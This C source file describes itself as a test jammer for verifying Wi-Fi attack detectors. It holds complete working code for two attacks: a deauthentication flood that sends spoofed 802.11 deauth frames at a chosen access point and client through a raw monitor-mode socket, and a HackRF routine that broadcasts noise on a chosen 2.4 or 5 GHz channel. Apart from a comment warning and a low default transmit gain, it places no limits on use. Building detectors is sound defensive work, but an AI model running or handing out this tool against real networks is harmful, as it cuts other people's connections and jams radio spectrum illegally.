// TEST JAMMER — for verifying detector operation only.
// WARNING: Use ONLY on hardware and spectrum you own.
//          RF jamming and deauth flooding are illegal on public networks.
//
// Mode 1 (deauth): floods deauth frames via a monitor-mode interface
//                  → tests Detector.c
// Mode 2 (rf):     broadcasts wideband noise via HackRF on a chosen channel
//                  → tests rf_jammer.c
//
// Compile: gcc -o jammer jammer.c -lhackrf -lm
// Usage:
//   sudo ./jammer deauth <iface> <target_bssid> <client_mac>
//   sudo ./jammer rf     <channel>   (2.4GHz: 1-14 | 5GHz: 36,40,44,48,52,56,60,64,100-144,149-165)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <signal.h>
#include <math.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <libhackrf/hackrf.h>

// ─── Constants ───────────────────────────────────────────────────────────────

#define SAMPLE_RATE   20000000   // 20 MHz
#define LNA_GAIN      40
#define VGA_GAIN      32
#define TX_VGA_GAIN   30         // TX gain (0–47 dB) — keep low for bench tests

static volatile int running = 1;
void handle_sigint(int s) { (void)s; running = 0; }

// ─── Helpers ─────────────────────────────────────────────────────────────────

static bool parse_mac(const char *str, uint8_t out[6]) {
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &out[0], &out[1], &out[2],
                  &out[3], &out[4], &out[5]) == 6;
}

static float channel_to_freq(int ch) {
    // 2.4GHz
    if (ch >= 1  && ch <= 13) return 2412.0f + (ch - 1) * 5.0f;
    if (ch == 14)             return 2484.0f;
    // 5GHz: standard channels use freq = 5000 + ch*5 MHz
    if ((ch >= 36 && ch <= 64  && ch % 4 == 0) ||
        (ch >= 100&& ch <= 144 && ch % 4 == 0) ||
        (ch >= 149&& ch <= 165 && (ch - 149) % 4 == 0))
        return 5000.0f + ch * 5.0f;
    return 0.0f;
}

// ─── Mode 1: Deauth flood ─────────────────────────────────────────────────────
//
// Sends 802.11 deauth frames (type=0x00, subtype=0x0C) at full speed.
// Requires wlan interface in monitor mode with injection support.

// Radiotap header — minimal, no flags
static const uint8_t radiotap_hdr[] = {
    0x00, 0x00,              // version, pad
    0x08, 0x00,              // header length = 8
    0x00, 0x00, 0x00, 0x00,  // present flags (none)
};

static void build_deauth(uint8_t *frame, size_t *len,
                         const uint8_t bssid[6],
                         const uint8_t client[6]) {
    uint8_t dot11[] = {
        0xC0, 0x00,              // FC: type=mgmt, subtype=deauth
        0x00, 0x00,              // duration
        client[0], client[1], client[2], client[3], client[4], client[5], // addr1 dst
        bssid[0],  bssid[1],  bssid[2],  bssid[3],  bssid[4],  bssid[5], // addr2 src
        bssid[0],  bssid[1],  bssid[2],  bssid[3],  bssid[4],  bssid[5], // addr3 BSSID
        0x00, 0x00,              // seq
        0x07, 0x00,              // reason: Class 3 frame received from nonassoc STA
    };

    memcpy(frame, radiotap_hdr, sizeof(radiotap_hdr));
    memcpy(frame + sizeof(radiotap_hdr), dot11, sizeof(dot11));
    *len = sizeof(radiotap_hdr) + sizeof(dot11);
}

static int deauth_flood(const char *iface,
                        const uint8_t bssid[6],
                        const uint8_t client[6]) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
    if (sock < 0) { perror("[!] socket"); return 1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("[!] ioctl SIOCGIFINDEX"); close(sock); return 1;
    }

    struct sockaddr_ll sa = {
        .sll_family   = AF_PACKET,
        .sll_ifindex  = ifr.ifr_ifindex,
        .sll_protocol = htons(0x0003),
    };

    uint8_t frame[128];
    size_t  frame_len;
    build_deauth(frame, &frame_len, bssid, client);

    printf("[deauth] Flooding deauth frames on %s → target %02X:%02X:%02X:%02X:%02X:%02X\n",
           iface, client[0], client[1], client[2],
           client[3], client[4], client[5]);
    printf("[deauth] Press Ctrl+C to stop.\n");

    unsigned long count = 0;
    while (running) {
        ssize_t sent = sendto(sock, frame, frame_len, 0,
                              (struct sockaddr *)&sa, sizeof(sa));
        if (sent < 0) { perror("[!] sendto"); break; }
        count++;
        if (count % 100 == 0)
            printf("[deauth] Sent %lu frames\r", count);
        fflush(stdout);
    }

    printf("\n[deauth] Stopped after %lu frames.\n", count);
    close(sock);
    return 0;
}

// ─── Mode 2: RF noise via HackRF ─────────────────────────────────────────────
//
// Generates band-limited Gaussian noise centred on the chosen channel.
// The noise fills the HackRF TX buffer with random IQ samples.

static int tx_callback(hackrf_transfer *transfer) {
    int8_t *buf = (int8_t *)transfer->buffer;
    int     len = transfer->valid_length;

    for (int i = 0; i < len; i++)
        buf[i] = (int8_t)(rand() & 0xFF);

    return 0;
}

static int rf_jam(int channel) {
    float freq = channel_to_freq(channel);
    if (freq == 0.0f) {
        fprintf(stderr, "[!] Invalid channel %d (must be 1–14).\n", channel);
        return 1;
    }

    hackrf_device *dev = NULL;
    if (hackrf_init() != HACKRF_SUCCESS) {
        fprintf(stderr, "[!] hackrf_init failed\n"); return 1;
    }
    if (hackrf_open(&dev) != HACKRF_SUCCESS) {
        fprintf(stderr, "[!] hackrf_open failed\n");
        hackrf_exit(); return 1;
    }

    hackrf_set_sample_rate(dev, SAMPLE_RATE);
    hackrf_set_freq(dev, (uint64_t)(freq * 1e6));
    hackrf_set_amp_enable(dev, 0);
    hackrf_set_lna_gain(dev, LNA_GAIN);
    hackrf_set_txvga_gain(dev, TX_VGA_GAIN);

    srand((unsigned)time(NULL));
    hackrf_start_tx(dev, tx_callback, NULL);

    printf("[rf] Transmitting noise on Ch%d (%.0f MHz). Press Ctrl+C to stop.\n",
           channel, freq);

    while (running && hackrf_is_streaming(dev) == HACKRF_TRUE)
        usleep(100000);

    hackrf_stop_tx(dev);
    hackrf_close(dev);
    hackrf_exit();
    printf("[rf] Stopped.\n");
    return 0;
}

// ─── Main ────────────────────────────────────────────────────────────────────

static void usage(const char *prog) {
    fprintf(stderr,
        "Usage:\n"
        "  sudo %s deauth <iface> <bssid> <client_mac>\n"
        "  sudo %s rf     <channel>  (2.4GHz: 1-14 | 5GHz: 36,40,44,48,52..165)\n"
        "\n"
        "Examples:\n"
        "  sudo %s deauth wlan0 AA:BB:CC:DD:EE:FF FF:EE:DD:CC:BB:AA\n"
        "  sudo %s rf 6\n",
        prog, prog, prog, prog);
}

int main(int argc, char *argv[]) {
    signal(SIGINT, handle_sigint);

    if (argc < 3) { usage(argv[0]); return 1; }

    if (strcmp(argv[1], "deauth") == 0) {
        if (argc != 5) { usage(argv[0]); return 1; }

        uint8_t bssid[6], client[6];
        if (!parse_mac(argv[3], bssid) || !parse_mac(argv[4], client)) {
            fprintf(stderr, "[!] Invalid MAC address format.\n");
            return 1;
        }
        return deauth_flood(argv[2], bssid, client);

    } else if (strcmp(argv[1], "rf") == 0) {
        int ch = atoi(argv[2]);
        return rf_jam(ch);

    } else {
        usage(argv[0]);
        return 1;
    }
}
